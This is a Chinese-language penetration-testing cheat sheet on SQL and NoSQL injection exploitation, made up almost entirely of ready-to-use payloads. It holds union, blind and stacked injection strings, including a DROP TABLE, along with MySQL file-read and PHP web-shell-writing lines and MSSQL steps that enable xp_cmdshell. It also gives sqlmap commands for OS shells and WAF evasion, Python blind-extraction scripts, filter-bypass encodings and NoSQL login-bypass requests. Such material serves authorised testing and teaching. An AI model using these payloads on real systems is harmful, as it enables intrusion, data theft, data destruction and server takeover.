---
id: 03-003
title: "💉 SQL注入利用 (SQL Injection Exploitation)"
category: 漏洞利用
category_en: Exploitation
difficulty: ★★★
tools: "SQLMap, NoSQLMap, 手动注入, jSQL"
last_updated: 2025-07
tags: ["exploitation", "web-attack", "sql-injection", "penetration-testing", "metasploit"]
subdomain: exploitation
nist_csf: ["DE.CM-08", "PR.IP-12"]
mitre_attack: ["T1190", "T1505", "T1203", "T1210"]
---
# 💉 SQL注入利用 (SQL Injection Exploitation)

## 概述
SQL注入是最危险的Web漏洞之一，通过操纵SQL查询实现数据库越权访问、数据泄露乃至服务器控制。

## 核心技能

### 1. SQL注入类型识别

```sql
-- 报错注入
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
' AND 1=CONVERT(int,(SELECT @@version))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--

-- 联合查询注入
' UNION SELECT 1,2,3,4,5--
' UNION SELECT 1,@@version,user(),database(),4--

-- 布尔盲注
' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>100--
' AND (SELECT LENGTH(database()))=4--

-- 时间盲注
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=100,SLEEP(5),0)--
' AND IF((SELECT LENGTH(database()))=4,SLEEP(5),0)--

-- 堆叠查询注入
'; DROP TABLE users;--
'; INSERT INTO users VALUES('hacker','pass');--
```

### 2. MySQL/Oracle/MSSQL差异利用

**MySQL：**
```sql
-- 版本检测
' UNION SELECT @@version,2,3--

-- 文件读取
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--

-- INTO OUTFILE写WebShell
' UNION SELECT "<?php system($_GET['cmd']);?>",2,3 INTO OUTFILE '/var/www/html/shell.php'--

-- 读取数据库
' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables WHERE table_schema=database()--
```

**Oracle：**
```sql
-- 版本检测
' UNION SELECT banner,NULL FROM v$version--
' UNION SELECT version,NULL FROM v$instance--

-- 表名枚举
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

**MSSQL：**
```sql
-- 版本检测
' UNION SELECT @@version,NULL,NULL--

-- xp_cmdshell执行命令
'; EXEC xp_cmdshell 'whoami';--

-- 启用xp_cmdshell（如已禁用）
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

-- 读取数据库
' UNION SELECT name,NULL,NULL FROM master..sysdatabases--
' UNION SELECT name,NULL,NULL FROM sysobjects WHERE xtype='U'--
```

### 3. SQLMap高级用法

```bash
# 基础使用
sqlmap -u "https://example.com/page?id=1" --batch

# 使用POST请求
sqlmap -u "https://example.com/login" --data="user=admin&pass=test&submit=Login"

# 使用请求文件（从Burp导出）
sqlmap -r login_request.txt -p user

# Cookie认证
sqlmap -u "https://example.com/page?id=1" --cookie="session=abc123"

# 指定数据库类型
sqlmap -u "https://example.com/page?id=1" --dbms=mysql --batch

# 高级检测级别
sqlmap -u "https://example.com/page?id=1" --level=5 --risk=3

# 获取数据库shell
sqlmap -u "https://example.com/page?id=1" --os-shell
sqlmap -u "https://example.com/page?id=1" --sql-shell

# 绕过WAF
sqlmap -u "https://example.com/page?id=1" --tamper=space2comment
sqlmap -u "https://example.com/page?id=1" --tamper=between,randomcase
sqlmap -u "https://example.com/page?id=1" --tamper=charencode,charunicodeencode
sqlmap -u "https://example.com/page?id=1" --random-agent --delay=2

# 从第二注入点利用
sqlmap -u "https://example.com/page?id=1" --second-url="https://example.com/admin"

# 请求限速
sqlmap -u "https://example.com/page?id=1" --delay=5 --safe-url="https://example.com" --safe-freq=10

# 配合代理
sqlmap -u "https://example.com/page?id=1" --proxy="http://127.0.0.1:8080"
```

### 4. 盲注自动化脚本

```python
#!/usr/bin/env python3
# blind_sqli.py - 布尔盲注自动化

import requests
import string

URL = "https://example.com/page"
PARAM = "id"
COOKIES = {"session": "abc123"}

def test_condition(condition):
    """测试SQL条件是否为真"""
    payload = f"1' AND {condition}--+-"
    params = {PARAM: payload}
    r = requests.get(URL, params=params, cookies=COOKIES)
    # 根据页面响应差异判断真/假
    return "Welcome" in r.text  # 调整为实际差异特征

# 获取数据库长度
db_length = 0
for i in range(1, 20):
    if test_condition(f"LENGTH(database())={i}"):
        db_length = i
        print(f"[+] Database length: {i}")
        break

# 逐字符获取数据库名
db_name = ""
chars = string.ascii_lowercase + string.digits + "_"
for pos in range(1, db_length + 1):
    for char in chars:
        ascii_val = ord(char)
        cond = f"ASCII(SUBSTRING(database(),{pos},1))={ascii_val}"
        if test_condition(cond):
            db_name += char
            print(f"[+] Database: {db_name}")
            break

print(f"[+] Database name: {db_name}")
```

```python
# time_based_blind.py - 时间盲注自动化

import requests
import time

URL = "https://example.com/page"
PARAM = "id"

def time_based_test(payload, delay=3):
    """测试时间盲注条件"""
    params = {PARAM: payload}
    start = time.time()
    r = requests.get(URL, params=params)
    elapsed = time.time() - start
    return elapsed >= delay

# 测试注入点
if time_based_test("1' AND SLEEP(3)--+-"):
    print("[+] Time-based SQL injection confirmed!")
else:
    print("[-] Not vulnerable")
```

### 5. WAF绕过技巧

```bash
# 注释符绕过
1'/**/OR/**/1=1--+-
1'%0aOR%0a1=1--+-     # 换行符

# 大小写混合
1' UnIoN SeLeCt 1,2,3--+-

# 双写绕过
1' UNUNIONION SELSELECTECT 1,2,3--+-

# 编码绕过
1' %256f%2572 1=1--+-  # 双重URL编码

# 等价函数替换
# AND -> &&
# OR -> ||
# = -> LIKE, REGEXP, <> , !=
# SLEEP() -> BENCHMARK()
1' && (SELECT BENCHMARK(5000000,MD5('test')))--+-

# 空白字符替换
1'%09OR%0a1=1--+-      # 使用不同空白

# HTTP参数污染
?id=1&id=2&id=1' UNION SELECT 1,2,3--+-
```

### 6. NoSQL注入

```bash
# MongoDB注入测试
curl -s -X POST https://api.example.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# MongoDB布尔注入
curl -s 'https://api.example.com/user?username=admin&password[$regex]=^a'
curl -s 'https://api.example.com/user?username=admin&password[$regex]=^b'
curl -s 'https://api.example.com/user?username[$ne]=null&password[$ne]=null'

# NoSQLMap
nosqlmap -u "https://api.example.com/login" --data '{"username":"admin","password":"test"}'
```

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| sqlmap | SQL注入自动化 | https://github.com/sqlmapproject/sqlmap |
| NoSQLMap | NoSQL注入 | https://github.com/codingo/NoSQLMap |
| jSQL Injection | GUI SQL注入 | https://github.com/ron190/jsql-injection |
| SQLiPy | SQL注入Burp插件 | https://github.com/codewatchorg/SQLiPy |

## 参考资源
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [SQLi Wiki](https://sqlwiki.netspi.com/)
- [NoSQL Injection Cheat Sheet](https://github.com/Charlie-belmer/nosqli-cheat-sheet)
